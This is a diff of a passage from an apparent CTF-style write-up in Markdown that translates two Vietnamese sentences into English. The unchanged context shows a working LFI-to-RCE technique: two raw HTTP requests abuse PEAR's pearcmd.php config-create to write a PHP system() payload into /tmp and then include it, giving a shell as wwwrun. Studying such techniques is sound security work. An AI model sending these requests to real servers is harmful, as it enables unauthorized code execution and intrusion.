@@ -77,7 +77,7 @@ Syntax: `pear config-create <root_path> <file_path>`
 If we call `pearcmd.php` via LFI and pass parameters via URL, we can force it to create a file containing malicious code.
 ### Shell as `wwwrun`
 
-Tôi đã thử tạo một file có tên là `sora1.php` thực hiện lệnh `id`:
+I tried creating a file named `sora1.php` and executing the command `id`:
 
 ```
 GET /locales/locale.json?+config-create+/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system('id')?>+/tmp/sora1.php HTTP/1.1
@@ -85,7 +85,7 @@ GET /locales/locale.json?+config-create+/&locale=../../../../../../usr/share/php
 
 ![](images/5.png)
 
-Sau đó thử kích hoạt payload:
+Then try activating the payload:
 
 ```
 GET /locales/locale.json?locale=../../../../../tmp&namespace=sora1 HTTP/1.1
